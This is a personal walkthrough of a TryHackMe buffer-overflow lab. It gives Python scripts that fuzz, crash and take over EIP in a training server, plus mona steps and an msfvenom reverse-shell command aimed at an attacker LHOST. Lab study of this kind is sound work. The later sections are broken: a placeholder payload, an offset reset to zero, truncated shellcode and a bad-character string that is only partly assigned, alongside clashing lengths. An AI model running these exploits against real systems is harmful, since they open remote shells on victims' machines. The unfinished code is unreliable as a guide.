

### Lab Setup

- Instead of using the Windows VM of THM I will download the folder `Vulnerable Apps` to my bare metal Windows 10 and do the exploits local in my network. 

- To do the exploit and take the flag of each task, I will change the `RHOST` and `RPORT` of my python scripts to point to the THM Lab and Buffer `Overflow PREP` Machine instead of my `Local fz3r0 Lab Machine`. 

- I will use the same setup for `Vuln Server` or other buffer overflow Labs:
        
    - Using Windows 10 Pro on a bare metal CPU
        - `chatserver.exe` + `.dll` running here
        - `Immunity Debugger` + `mona` running here
                
    - Using Kali Linux in a VMware Pro VM
        - `python` scripts and tricky tricks running here
            
    - Both machines connected on the same Network 192.168.1.0/24 (My local Network)
            
    - Once I've exploited the program `chatserver.exe` in my own machine, then I can exploit "the real" server with the final script:
            
        - `TryHackMe - Buffer Overflow Prep` Network, UK.    
        
    - So I will transfer the files from the TryHackMe Machine-FTP to a folder to my Windows 10 and use from there `Immunity Debugger` and also run the `oscp.exe` binary.
        
        - ![image](https://user-images.githubusercontent.com/94720207/169673734-7b549b57-8efc-46d2-8d3f-a99a5d7aee7a.png)
          
    - Easy! Let's do it! 

--- 

### Mona Configuration

- The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    - `!mona config -set workingfolder c:\mona\%p`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169673777-cf70c41e-5ce9-445f-885a-77515903a49b.png)
 
---

### Launching oscp.exe

- Launch as admin `oscp.exe` server:

   - ![image](https://user-images.githubusercontent.com/94720207/169673859-b4c4060e-b9bf-4c7c-90d4-57f365ff4106.png)

- Testing connection from a `netcat`:

    - ![image](https://user-images.githubusercontent.com/94720207/169673900-ac2e6ca1-fb29-45a6-93e7-c5daf539d065.png)

- Attach `oscp.exe` to `Immunity Debugger`

    - ![image](https://user-images.githubusercontent.com/94720207/169674019-099f0c58-5760-4bbc-b527-59f142fada31.png)
  
- Lock and Loaded!

---

### 1. Fuzzing

- The fuzzer will send increasingly long strings comprised of `A`. 
    
- If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. 
    
- Make a note of the largest number of bytes that were sent.

- **Local IPv4 Version `192.168.1.100`**

    - `overflow1_step1_fuzzing.py` (chmod +x)

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.1.100"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

- ![image](https://user-images.githubusercontent.com/94720207/169673843-c4473b9d-630f-4e73-b1a7-3672623c6083.png)

    - **Execute it:**

        - **`python3 overflow1_step1_fuzzing.py`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169674064-e5f1e173-7342-4e1e-848a-0e9350bf70b1.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169674167-39262a16-968f-40c1-a052-d7fd0f302d61.png)
 
- **Results:**

- << **Initial Crash at: `2000 bytes` (A * 2000)** >> 
        
    - _Note: Restart the Lab after the crash._ 

---

### 2. Crash Replication

- Run the following command to generate a cyclic pattern of a length `2400 bytes` longer **(2000+400)** that the string that crashed the server (change the -l value to this):

    - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400` 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169674239-750924b4-ab80-4a48-81ef-129e393686dd.png)
 
- Copy the output and place it into the `payload` variable of the `overflow1_step2_exploit.py` script. 

- Create:

    - `overflow1_step2.1_CrashReplication.py` (chmod +x)

```python
#!/usr/bin/env python3

import socket

ip = "192.168.1.100"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

- ![image](https://user-images.githubusercontent.com/94720207/169674365-430369ec-0bd2-4989-84a4-688a2cccdf3b.png)

    - **Execute it:**

        - **`overflow1_step2.1_CrashReplication.py`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169674431-bafa5cbc-a013-4ea0-891a-65af5359d3f5.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169674447-06bbf9c3-4c89-4f99-b335-b8dd727d3254.png)
 
        - << **Crashed at: `2000 bytes` (A * 2000)** >> 
        
- The script should crash the `oscp.exe` server again. 

- This time, in `Immunity Debugger`, in the **command input box at the bottom of the screen**, run the following **mona command**, changing the distance to the same length as the pattern you created:

    - `!mona findmsp -distance 2000`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169674704-3a488180-4293-47e3-9c72-a9c892c37a39.png)
    
- Mona should display a log window with the output of the command. 

    - If not, click the `Window` menu and then `Log data` to view it (choose "CPU" to switch back to the standard view).

- In this output you should see a line which states:

    - `EIP contains normal pattern : ... (offset XXXX)`

### Results

- << **Initial Crash at: `2000 bytes` (A * 2000)** >> 

- << **Exact Offset for Crash: `1978 bytes` (A * 1978)** >> 

    - _Note: Restart the Lab after the crash._

---

### 3 Controlling EIP

1. Update the python script with a new called `overflow1_step3_controllingEIP.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**.
  
    - Offset: `1978` bytes 

2. Set the `payload` variable to an **empty string again**. 

3. Set the `retn` variable to `BBBB`.

    - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 

- **Note: Executing the next script is not necessary for the exploit, so, from here you can only make the script and save it for the next step**

- Create:

    - `overflow1_step3_controllingEIP.py` (chmod +x)

```python
import socket

ip = "192.168.1.100"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
- ![image](https://user-images.githubusercontent.com/94720207/169674891-1c4ecc23-5571-4dc0-a23b-8e73278c2808.png)

    - **Execute it:**

        - **`overflow1_step3_controllingEIP.py`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169674956-b6c8fa60-0e9c-4fab-80b8-9c479ccb2f1e.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169674990-141ae8c6-d03d-4304-ae11-481d9294fc87.png)

- The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

### Results

- << **Initial Crash at: `2000 bytes` (A * 2000)** >> 

- << **Exact Offset for Crash: `1978 bytes` (A * 1978)** >> 

- << **"Perfect world" buffer gap A = 1978 bytes + (EIP) B = 4 bytes, controlling EIP just at `1978(A's) + 4(B's)` with `42424242` `BBBB`** >> 
    
    - _Note: Restart the Lab after the crash._

---  

### 4. Finding Bad Characters

- Generate a `bytearray` using `mona`, and **exclude the null byte `\x00` by default.** 

- Note the location of the `bytearray.bin` file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be `C:\mona\oscp\bytearray.bin`).

    - `!mona bytearray -b "\x00"`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169675140-ff7dd2ea-207e-4318-ab84-7b22a94af7b9.png)
    
- Now, generate a string of bad chars from \x01 to \xff**:

```python
# Byte Array (badchars) creator

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

- Now, generate a **string of bad chars** that is **identical to the bytearray** (or just use the next I made:). 

```
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

- Create `overflow1_step4_findBadchars.py` script and set the `payload` variable **to the string of bad chars the script generates.**

```python
import socket

ip = "192.168.1.100"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```    

- ![image](https://user-images.githubusercontent.com/94720207/169675396-81867aaf-101c-44d4-8f90-a6718a369ead.png)

    - **Execute it:**

        - **`overflow1_step4_findBadchars.py`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169675534-8abf7836-f498-48cf-a0be-34bfb613cb39.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169676966-a0828e86-f6de-4b32-a4d0-65fb07a7439b.png)

- Step by step:

1. Run `oscp.exe` and `immunity debugger` and **make the byte array in mona:**

    - `!mona bytearray -b "\x00"`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169675140-ff7dd2ea-207e-4318-ab84-7b22a94af7b9.png)` 

2. Run the python script for first time with all the badchars from \x01 to \xFF:

    -  

3. **Make a note of the address to which the `ESP` register points:

    - **ESP points: `011EFA18`**

4.  Now use it in the following `mona` command for compare de previously generated array:**
    
    - `!mona compare -f C:\mona\oscp\bytearray.bin -a 011EFA18`

5. A popup window should appear labelled "mona Memory comparison results". _If not, use the Window menu to switch to it._

- ![image](https://user-images.githubusercontent.com/94720207/169677013-decb7889-d6a6-4ebd-97e3-1498563e487d.png)

- **The window shows the results of the comparison**, indicating any characters that are different in memory to what they are in the generated `bytearray.bin` file.

    - **IMPORTANT: Not all of these might be `badchars`! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string. _(Just like the example in the vuln server lab)_**
    
- **Find Badchars:**
    
    1. The first badchar in the list should be the null byte `\x00` since we already removed it from the file. 
    
    2. Make a note of any others. 
    
    3. Generate a new `bytearray` in `mona`, specifying these new `badchars` along with `\x00`. 
    
    4. Then update the `payload` variable in your `overflow1_step4_findBadchars.py` script and remove the **new badchars** as well.

    5. Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step4_findBadchars.py` script again. 
    
    6. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 

        - Pass 1:
         
            - **ESP points: `010EFA18`** 
            
            - `!mona compare -f C:\mona\oscp\bytearray.bin -a 010EFA18`

            - ![image](https://user-images.githubusercontent.com/94720207/169675947-9063f186-7836-4f9d-9195-44e014049934.png)
        
        - Pass 2 (badchar `x00` , `x01` removed from python script): 
        
            - ![image](https://user-images.githubusercontent.com/94720207/169677289-2ab186ae-0512-4012-baec-e8656a6dc1a1.png)
            
            - **ESP points: `0116FA18`**

            - `!mona compare -f C:\mona\oscp\bytearray.bin -a 0116FA18`
            
            - ![image](https://user-images.githubusercontent.com/94720207/169677321-bdc4c93d-edb7-491e-8d63-e137c2317ef1.png)
 
        - Pass 3 (badchar `x00` , `x01` , `x07` , `x08` , `x21` removed from python script): 
        
            - **ESP points: `0118FA18`**

            - `!mona compare -f C:\mona\oscp\bytearray.bin -a 0118FA18`
            
            - ![image](https://user-images.githubusercontent.com/94720207/169676282-9e22aec6-c759-415c-af6e-5cc52ea9c9e9.png)
            
                - Pass 3 shows the same results as Pass 2. 
--- 

### 4. Finding a Jump Point

- With the `oscp.exe` either **running or in a crashed state**, run the following `mona` command...

    - **Making sure to update the `-cpb` option with all the `badchars` you identified (including `\x00`)**:

        - `!mona jmp -r esp -cpb "\x00"`

    - This command finds all `JMP ESP` (or equivalent) instructions with addresses that don't contain any of the badchars specified. 
    
    - The results should display in the `Log data` window (use the Window menu to switch to it if needed).

    - Choose an address and update your python script with the new `overflow1_step4_findJumpPoint.py` script.
    
        - Set the `retn` variable to the `address`, written `"special backwards"` (since the system is `little endian`). 
        
            - **For example:**
            
                - If the address is `\x01\x02\x03\x04` 
                
                - in Immunity, write it as `\x04\x03\x02\x01` in your exploit.

```python
import socket

ip = "10.10.56.134"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "necesito poner algo aqui weyyyyyyyyyyyyy"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

---

### 5. Generate the final Payload

- Run the following `msfvenom` command on Kali, using your Kali `VPN IP` as the `LHOST` and updating the `-b` option with all the badchars you identified (including `\x00`):

    - `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.123.13 LPORT=4444 EXITFUNC=thread -b "\x00" -f c`

- Copy the generated `C code strings` and integrate them into a new modifies python script called `overflow1_step567_Final_Payload.py` script payload variable using the following notation:   

```python
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

--- 

### Prepend NOPs / Padding

- Since an **encoder was likely used to generate the payload**, you will need some **space in memory for the payload to unpack itself**. 

    - **You can do this by setting the `padding` variable to a string of `16 or more` `"No Operation"` (`\x90`) bytes:

        - `padding = "\x90" * 16`
        
- Add this to the `overflow1_step567_Final_Payload.py` script:

```python
payload = (huevos)
```

---

### Exploit!!! Que chille!

- Checklist for correct variables: 

    1. prefix
    2. offset
    3. return address
    4. padding
    5. payload set
    
- **You can now exploit the buffer overflow to get a reverse shell!**

    - Start a netcat listener on your Kali box using the `LPORT` you specified in the `msfvenom` command eg. `4444`

    - Restart `oscp.exe` and `Immunity Debugger` and run the modified `overflow1_step567_Final_Payload.py` script. 
    
        - **Your netcat listener should catch a reverse shell!**

---

### References

- https://tryhackme.com/room/bufferoverflowprep
- https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
- https://youtu.be/eLIRjcI5eYU
